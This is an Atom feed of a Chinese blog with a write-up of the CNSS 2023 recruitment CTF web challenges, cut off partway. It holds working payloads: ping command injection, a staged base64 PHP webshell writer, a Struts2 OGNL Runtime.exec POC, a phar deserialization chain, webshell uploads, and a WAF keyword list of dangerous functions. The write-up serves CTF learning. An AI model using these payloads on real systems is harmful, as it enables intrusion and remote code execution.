<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Leon&#39;s blog😽</title>
  
  <subtitle>写些随笔</subtitle>
  <link href="https://foreon.github.io/atom.xml" rel="self"/>
  
  <link href="https://foreon.github.io/"/>
  <updated>2023-12-02T18:10:56.308Z</updated>
  <id>https://foreon.github.io/</id>
  
  <author>
    <name>Leon</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CNSS Recruit 2023 Writeup</title>
    <link href="https://foreon.github.io/posts/16427.html"/>
    <id>https://foreon.github.io/posts/16427.html</id>
    <published>2023-12-02T18:08:56.000Z</published>
    <updated>2023-12-02T18:10:56.308Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CNSS-Recruit-2023-Writeup"><a href="#CNSS-Recruit-2023-Writeup" class="headerlink" title="CNSS Recruit 2023 Writeup"></a>CNSS Recruit 2023 Writeup</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-📗-CNSS-2023-Web-Guideline"><a href="#1-📗-CNSS-2023-Web-Guideline" class="headerlink" title="1.📗 CNSS 2023 Web Guideline"></a>1.📗 CNSS 2023 Web Guideline</h3><p>没什么好说的</p><h3 id="2-🙋-PHPinfo"><a href="#2-🙋-PHPinfo" class="headerlink" title="2.🙋 PHPinfo"></a>2.🙋 PHPinfo</h3><p>&#x2F;phpinfo()找到flag</p><h3 id="3-🦴-babyHTTP"><a href="#3-🦴-babyHTTP" class="headerlink" title="3.🦴 babyHTTP"></a>3.🦴 babyHTTP</h3><p>按提示来就行</p><h3 id="4-🏓-Ping"><a href="#4-🏓-Ping" class="headerlink" title="4.🏓 Ping"></a>4.🏓 Ping</h3><p>ping 127.0.0.1;ls &#x2F; # 找到flag</p><p>ping 127.0.01;cat &#x2F;flag # 得到flag</p><h3 id="5-🥇-我得再快点"><a href="#5-🥇-我得再快点" class="headerlink" title="5.🥇 我得再快点"></a>5.🥇 我得再快点</h3><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.Session()</span><br><span class="line">url=<span class="string">&#x27;http://124.221.34.13:55590/&#x27;</span></span><br><span class="line">r=s.get(url)</span><br><span class="line"></span><br><span class="line">res=r.text</span><br><span class="line"></span><br><span class="line">a=res.find(<span class="string">&quot;&lt;p&gt;&quot;</span>)</span><br><span class="line">b=res.find(<span class="string">&quot;/p&gt;&quot;</span>,a)</span><br><span class="line"><span class="comment">#找到我们要计算的式子的前后位置</span></span><br><span class="line">num=res[a+<span class="number">9</span>:b-<span class="number">28</span>]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"></span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(num.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">encodeStr = m.hexdigest()</span><br><span class="line"><span class="built_in">print</span> (encodeStr)</span><br><span class="line">en=<span class="built_in">str</span>.upper(encodeStr)</span><br><span class="line"><span class="built_in">print</span>(en)</span><br><span class="line">playload=&#123;</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>:en</span><br><span class="line">&#125;</span><br><span class="line">r=s.get(url=url,params=playload)</span><br><span class="line"><span class="built_in">print</span>(r.content)</span><br><span class="line">url2=<span class="string">&#x27;http://124.221.34.13:55590/check?value=&#x27;</span>+encodeStr</span><br><span class="line">r2=s.get(url2)</span><br><span class="line"><span class="built_in">print</span>(r2.text)</span><br></pre></td></tr></table></figure><h3 id="🐶-CNSS娘の宠物商店"><a href="#🐶-CNSS娘の宠物商店" class="headerlink" title="🐶 CNSS娘の宠物商店"></a>🐶 CNSS娘の宠物商店</h3><p>使用双等号绕过，原理：</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450d1eb6ea8.png">密码输入’&#x3D;‘</p><img src="G:\hexo-blog\source\_posts\CNSS-Recruit-2023-Writeup.assets\65450d2c37796.png" title="" alt="" width="210"><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450d34c9074.png"></p><h3 id="6-🥵-2048"><a href="#6-🥵-2048" class="headerlink" title="6.🥵 2048"></a>6.🥵 2048</h3><p>卡了一会，发现所有数据变化都在前端完成的，那么只要在前端做文章就行。看了一圈就改JavaScript吧(我之前还不知道JavaScript文件能在源代码界面修改并保存的</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450d3c4c89e.png"></p><p>找到score的判定条件然后改成0保存，得到flag</p><h3 id="7-👤-换个头像先"><a href="#7-👤-换个头像先" class="headerlink" title="7.👤 换个头像先"></a>7.👤 换个头像先</h3><p>发现只能上传图片，随便上传一个图片木马，然后burp抓包，把.png后缀改成.php，蚁剑连接</p><h3 id="8-7️⃣-EZRCCCCE"><a href="#8-7️⃣-EZRCCCCE" class="headerlink" title="8.7️⃣ EZRCCCCE"></a>8.7️⃣ EZRCCCCE</h3><p>在tim大佬的提示下做出来了</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450d3fcb5f7.png"></p><p>过滤了一些东西，但是限制长度了</p><p>明显要用命令拼接来过题，注意这里的sandbox是给我们创建了一个私人路径，我就是卡在这一步了</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://124.221.34.13:55559/?6=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        s=requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        <span class="built_in">print</span>((s.text))</span><br><span class="line"><span class="comment">#检查是否攻击成功</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://124.221.34.13:55559/sandbox/5466482a195fb9b91138de0cb507f8bf/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里检查成功的路径要pwd查一下</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450d448f878.png"></p><p>然后ls &#x2F;看到flag把它cat出来，这里注意分号闭合语句</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450d4725a6e.png"></p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450d59be0cc.png"></p><h3 id="10-🐱-Tomcat-cat"><a href="#10-🐱-Tomcat-cat" class="headerlink" title="10.🐱 Tomcat?cat~"></a>10.🐱 Tomcat?cat~</h3><p>猫猫可爱捏</p><p>这题考察struts2漏洞</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450d4aaf617.png"> </p><img src="file:///C:/Users/William/Desktop/05c593c7fb880265e58cde70c8840dc4.gif" title="" alt="05c593c7fb880265e58cde70c8840dc4.gif" width="389"><p>参考csdn文章：<a href="https://blog.csdn.net/q20010619/article/details/120729447">CTFshow刷题日记-WEB-JAVA（web279-300）Struts2全漏洞复现，Java漏洞复现_debug&#x3D;command&amp;expression表达式注入漏洞如何修复_OceanSec的博客-CSDN博客</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POC:</span><br><span class="line"><span class="string">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;</span>cat webapps/flaaaaaaag/flag.jsp<span class="string">&#x27;).getInputStream())) + &#x27;</span></span><br></pre></td></tr></table></figure><p>这题flag藏的有点深，一般在目录就看到了，问了大佬才做出来，一度以为方向错了😭</p><p>大佬说是struts2有点太简单了，藏深点上上难度</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450da2e60d4.png"></p><h3 id="🔧-where-is-my-unserialize"><a href="#🔧-where-is-my-unserialize" class="headerlink" title="🔧 where is my unserialize?"></a>🔧 where is my unserialize?</h3><p>这题学到了不少，也踩了不少坑</p><p>首先file&#x3D;xxx.php是可以查原码的</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450da3c364c.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shino</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shin0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;shin0 = <span class="string">&#x27;cnss&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_sayhello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&lt;h1&gt;I know you are in a hurry, but don not rush yet.&lt;h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;shin0 = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;shin0.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CN55</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_get</span>(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$haha</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;key.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;haha[<span class="string">&#x27;hehe&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;hackerrrrrr!&lt;br&gt;join CNSS~&lt;h1&gt;&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;   <span class="comment">//Do you know &#x27;Php ARchive&#x27;?</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没有unserilize()，再加上上传文件，考察phar反序列化</p><p>原理：</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450da4cece0.png"></p><p>这里先记录一下为什么第一次我没能成功</p><p>第一次的poc:</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450da5b107b.png"></p><p>错在赋值不能以$cnss()的形式，因为都要赋值常数！！</p><p>成功的POC:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shino</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shin0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CN55</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$haha</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;key.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;haha[<span class="string">&#x27;hehe&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cn</span>=<span class="keyword">new</span> <span class="title function_ invoke__">CNSS</span>(<span class="string">&#x27;cnss&#x27;</span>);</span><br><span class="line"><span class="variable">$cnss</span> =<span class="keyword">new</span> <span class="title class_">CN55</span>();</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="string">&#x27;6&#x27;</span>);</span><br><span class="line"><span class="variable">$s</span>-&gt;haha[<span class="string">&#x27;hehe&#x27;</span>]=<span class="variable">$cnss</span>;</span><br><span class="line"><span class="variable">$cnss</span>-&gt;params[<span class="string">&#x27;key&#x27;</span>]=<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$cn</span>-&gt;name=<span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;1.phar&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$cn</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;leon.txt&quot;</span>, <span class="string">&quot;leon&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>拿到flag了</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450da6af0f2.png"></p><h3 id="🚓-can-can-need-shell"><a href="#🚓-can-can-need-shell" class="headerlink" title="🚓 can can need shell"></a>🚓 can can need shell</h3><p>在大佬的不断提示下整出来了，菜鸟成长全靠老师傅们😭</p><p>根据提示加&#x2F;admin</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450da76eb70.png"></p><p>提示了账号密码都是admin</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450da84afcc.png"></p><p>进入管理员后台，这题考察lavarel模板文件上传漏洞，找到下图的教程，原理是burp抓包jpg马，然后后缀加.php蚁剑连接，但是这题有waf</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450db028956.png"></p><p>waf:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$dangerous</span> = <span class="keyword">array</span>(<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;serialize&#x27;</span>,<span class="string">&#x27;link&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;write&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span 